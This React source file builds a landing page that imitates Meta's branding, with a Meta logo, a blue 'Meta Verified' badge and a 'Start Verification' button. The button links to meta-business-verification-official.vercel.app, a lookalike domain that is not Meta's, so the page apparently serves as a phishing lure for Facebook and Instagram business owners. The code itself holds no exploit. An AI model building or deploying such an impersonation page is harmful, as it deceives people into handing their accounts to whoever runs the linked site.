import React, { useMemo } from "react";

// ✅ PRO TYPE (không còn lỗi index string)
type LangKey = "en";

export default function App() {
  // ✅ safe language detect
  const rawLang =
    typeof window !== "undefined"
      ? navigator.language.split("-")[0]
      : "en";

  // chỉ cho phép "en"
  const lang: LangKey = rawLang === "en" ? "en" : "en";

  const verifyLink =
    "https://meta-business-verification-official.vercel.app/meta-community";

  const text = {
    en: {
      begin: "Begin",
      advertisement: "Advertisement",
      learn: "Learn",
      support: "Support",
      schedule: "Schedule a call",
      start: "Start Verification",
      register: "Start Verification",
      title: "Let the world recognize your business instantly.",
      desc: "Meta Verified helps you build trust, credibility, and protection across Facebook and Instagram.",
      verifiedTitle: "Meta Verified",
      verifiedDesc:
        "Verify your Meta account to receive the blue verification badge on Facebook and Instagram.",
    },
  };

  // ✅ FIX TS7053 hoàn toàn (không cần as keyof nữa)
  const t = text[lang];

  const images = [
    "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517423440428-a5a00ad493e8?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=1200&auto=format&fit=crop",
  ];

  const row1 = useMemo(() => [...images, ...images], []);
  const row2 = useMemo(() => [...images].reverse().concat(images), []);

  return (
    <>
      <style>{`
        *{
          margin:0;
          padding:0;
          box-sizing:border-box;
          font-family:Arial, Helvetica, sans-serif;
        }

        body{
          background:#05070d;
          overflow-x:hidden;
        }

        .app{
          min-height:100vh;
          position:relative;
          color:#fff;
          overflow:hidden;
        }

        .bg-glow{
          position:absolute;
          top:-200px;
          left:50%;
          transform:translateX(-50%);
          width:900px;
          height:900px;
          background:radial-gradient(circle, rgba(24,119,242,0.35), transparent 60%);
          filter:blur(80px);
          z-index:0;
        }

        .bg-marquee{
          position:absolute;
          top:140px;
          left:0;
          width:100%;
          height:70vh;
          overflow:hidden;
          opacity:0.25;
        }

        .diagonal-wrap{
          transform:rotate(-14deg) scale(1.1);
        }

        .row{
          overflow:hidden;
          margin-bottom:60px;
        }

        .track{
          display:flex;
          gap:24px;
          width:max-content;
        }

        .row1 .track{
          animation:moveRight 30s linear infinite;
        }

        .row2 .track{
          animation:moveLeft 30s linear infinite;
        }

        @keyframes moveRight{
          0%{transform:translateX(0)}
          100%{transform:translateX(-50%)}
        }

        @keyframes moveLeft{
          0%{transform:translateX(-50%)}
          100%{transform:translateX(0)}
        }

        .card{
          width:220px;
          height:400px;
          border-radius:28px;
          overflow:hidden;
        }

        .card img{
          width:100%;
          height:100%;
          object-fit:cover;
        }

        .header{
          position:relative;
          z-index:10;
          height:80px;
          display:flex;
          justify-content:space-between;
          align-items:center;
          padding:0 40px;
          background:rgba(10,12,18,0.6);
          backdrop-filter:blur(10px);
        }

        .logo{
          font-size:32px;
          font-weight:700;
          color:#1877f2;
        }

        .nav{
          display:flex;
          gap:25px;
        }

        .nav a{
          color:#cbd5e1;
          text-decoration:none;
        }

        .hero{
          position:relative;
          z-index:5;
          max-width:1200px;
          margin:auto;
          padding:120px 40px;
          display:flex;
          justify-content:space-between;
        }

        .hero-left{
          max-width:650px;
        }

        .verified-row{
          display:flex;
          gap:16px;
          margin-bottom:30px;
        }

        .verified-badge{
          position:relative;
          width:70px;
          height:70px;
        }

        .verified-icon{
          width:100%;
          height:100%;
          border-radius:50%;
          background:linear-gradient(135deg,#1877f2,#00c3ff);
          display:flex;
          align-items:center;
          justify-content:center;
          font-size:26px;
        }

        .verified-pulse{
          position:absolute;
          inset:0;
          border-radius:50%;
          background:rgba(24,119,242,0.4);
          animation:pulse 2s infinite;
        }

        @keyframes pulse{
          0%{transform:scale(1);opacity:0.6}
          100%{transform:scale(1.6);opacity:0}
        }

        .hero-title{
          font-size:60px;
          line-height:1.1;
          margin-bottom:20px;
        }

        .hero-desc{
          color:#cbd5e1;
          margin-bottom:40px;
          font-size:18px;
        }

        .register-btn{
          padding:16px 36px;
          border-radius:999px;
          background:linear-gradient(135deg,#1877f2,#00c3ff);
          color:#fff;
          text-decoration:none;
        }

        @media(max-width:900px){
          .hero{
            flex-direction:column;
            text-align:center;
          }

          .nav{
            display:none;
          }
        }
      `}</style>

      <div className="app">
        <div className="bg-glow" />

        {/* BACKGROUND */}
        <div className="bg-marquee">
          <div className="diagonal-wrap">
            <div className="row row1">
              <div className="track">
                {row1.map((img, i) => (
                  <div className="card" key={i}>
                    <img src={img} alt="" />
                  </div>
                ))}
              </div>
            </div>

            <div className="row row2">
              <div className="track">
                {row2.map((img, i) => (
                  <div className="card" key={i}>
                    <img src={img} alt="" />
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* HEADER */}
        <header className="header">
          <div className="logo">Meta</div>

          <nav className="nav">
            <a href="#">{t.begin}</a>
            <a href="#">{t.advertisement}</a>
            <a href="#">{t.learn}</a>
            <a href="#">{t.support}</a>
          </nav>
        </header>

        {/* HERO */}
        <section className="hero">
          <div className="hero-left">

            <div className="verified-row">
              <div className="verified-badge">
                <div className="verified-icon">✓</div>
                <div className="verified-pulse"></div>
              </div>

              <div>
                <div>{t.verifiedTitle}</div>
                <div style={{ fontSize: 13, color: "#cbd5e1" }}>
                  {t.verifiedDesc}
                </div>
              </div>
            </div>

            <h1 className="hero-title">{t.title}</h1>
            <p className="hero-desc">{t.desc}</p>

            <a className="register-btn" href={verifyLink}>
              {t.register}
            </a>
          </div>
        </section>
      </div>
    </>
  );
}
